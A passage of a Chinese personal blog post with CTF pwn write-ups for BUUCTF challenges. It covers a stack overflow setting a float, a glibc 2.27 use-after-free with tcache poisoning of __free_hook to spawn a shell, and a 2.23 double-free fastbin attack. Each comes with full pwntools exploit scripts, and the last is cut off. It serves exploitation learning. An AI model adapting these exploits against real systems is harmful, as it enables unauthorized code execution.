    </a>
      <p class="site-subtitle" itemprop="description">浅薄的技术博客</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://howahh.github.io.git/2024/09/26/pwn-wp1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="0xahh">
      <meta itemprop="description" content="技术">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0xahh的博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          pwn_wp1
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-09-26 19:16:45 / 修改时间：21:04:07" itemprop="dateCreated datePublished" datetime="2024-09-26T19:16:45+08:00">2024-09-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>[toc]</p>
<h1 id="pwn-writeup记录"><a href="#pwn-writeup记录" class="headerlink" title="pwn writeup记录"></a>pwn writeup记录</h1><h2 id="1-buu-护网杯-2018-gettingstart"><a href="#1-buu-护网杯-2018-gettingstart" class="headerlink" title="1.buu 护网杯_2018_gettingstart"></a>1.buu 护网杯_2018_gettingstart</h2><span id="more"></span>

<p><img src="/images/v2-8ea95e81369ca2d3c3e805bcf32f0492_720w.png" alt="img"></p>
<p>只要v6=0.1就行了，用这个网站就好了<a target="_blank" rel="noopener" href="https://www.binaryconvert.com/convert_double.html?decimal=048046049">浮点数转化</a>。转了后就是0x3FB999999999999A</p>
<p><img src="/images/v2-455547651059df6802f891829a79c35c_720w.png" alt="img"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">0</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29947</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

<span class="token comment"># debug('b *$rebase(0xA36)')</span>
payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'you.'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2-buu-ciscn-2019-en-3（puts函数漏洞，uaf）"><a href="#2-buu-ciscn-2019-en-3（puts函数漏洞，uaf）" class="headerlink" title="2.buu ciscn_2019_en_3（puts函数漏洞，uaf）"></a>2.buu ciscn_2019_en_3（puts函数漏洞，uaf）</h2><p>一道2.27的堆题，保护全开，菜单题，但edit和show都没用，无法通过堆来泄露出libc地址，但在题目开始的输入name和ID有一个漏洞，可以利用用于泄露libc，然后就可以利用uaf了</p>
<p><img src="/images/v2-1097e51ae5e4ed3e65d9e5b98581257d_720w.png" alt="img"></p>
<p>puts函数在遇到\x00前不会停止输出，所以利用这个来做。看一下输入后的栈空间，如果输入满8个的话，就会把后面的一个libc上的地址给带出来，就泄露了libc，后面就是uaf了。</p>
<p><img src="/images/v2-8936aa3c1132ae34178c97ebdaff98c3_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25810</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'choice:'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'story: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'story: '</span>

menu_del <span class="token operator">=</span> <span class="token number">4</span>
del_index_words <span class="token operator">=</span> <span class="token string">'index:'</span>

menu_show <span class="token operator">=</span> <span class="token number">3</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">22</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
<span class="token comment"># debug('b *$rebase(0xE2C)')</span>
<span class="token comment">#puts漏洞，遇到\x00才停止输出，泄露libc</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'ID.'</span><span class="token punctuation">,</span><span class="token string">b'bbbbbbbb'</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>
libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x81237</span>
leak_info<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
<span class="token comment"># debug()</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pause()</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>2.27版本的tcache没限制数组在count&gt;0时才能取，2.31后就会有这个限制了，记错了</p>
<p><img src="/images/v2-7a32cf8d7d871815209dd21c5182f934_720w.png" alt="img"></p>
<h2 id="3-buu-gyctf-2020-some-thing-exceting-2-23double-free"><a href="#3-buu-gyctf-2020-some-thing-exceting-2-23double-free" class="headerlink" title="3.buu gyctf_2020_some_thing_exceting(2.23double free)"></a>3.buu gyctf_2020_some_thing_exceting(2.23double free)</h2><p><img src="/images/v2-58fc10f0b586d0a99f498eab09793970_720w.png" alt="img"></p>
<p><img src="/images/v2-43b04b5eb6dac6750e561dacf7214206_720w.png" alt="img"></p>
<p><img src="/images/v2-f3b0af03edcda6f07762f93d8e414dce_720w.png" alt="img"></p>
<p>一道2.23的题目，doublefree，但利用方法有些不一样，没有edit，程序把flag读入并写入了bss段上，所以利用doublefree把bss段上勾走的fakechunk放入fastbin中，并最后显示。刚刚doublefree后的堆空间，有点没理解为什么有一个被释放的0x60的chunk变成了used且也不在fastbin中，不过不影响后面做题，毕竟已经有一个chunk被doublefree了</p>
<p><img src="/images/v2-33e7de6d17fdf615154c2004aa2f4d17_720w.png" alt="img"></p>
<p>将fakechunk给add进去，就可以看到进入fastbin中了，后面申请两次就可以读到了。</p>
<p><img src="/images/v2-480f9a75ebf57150def7649aa92c483f_720w.png" alt="img"></p>
<p>给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">28635</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'do :'</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'ba\'s length : '</span>
add_content_words <span class="token operator">=</span> <span class="token string">'ba : '</span>
add_size_words1 <span class="token operator">=</span> <span class="token string">'na\'s length : '</span>
add_content_words1 <span class="token operator">=</span> <span class="token string">'na : '</span>

menu_del <span class="token operator">=</span> <span class="token number">3</span>
del_index_words <span class="token operator">=</span> <span class="token string">'ID : '</span>

menu_show <span class="token operator">=</span> <span class="token number">4</span>
show_index_words <span class="token operator">=</span> <span class="token string">'SCP project ID : '</span>

menu_edit <span class="token operator">=</span> <span class="token number">2</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>size1<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span>content1<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words1<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words1<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size1<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words1<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words1<span class="token punctuation">,</span> content1<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
<span class="token comment"># debug()</span>
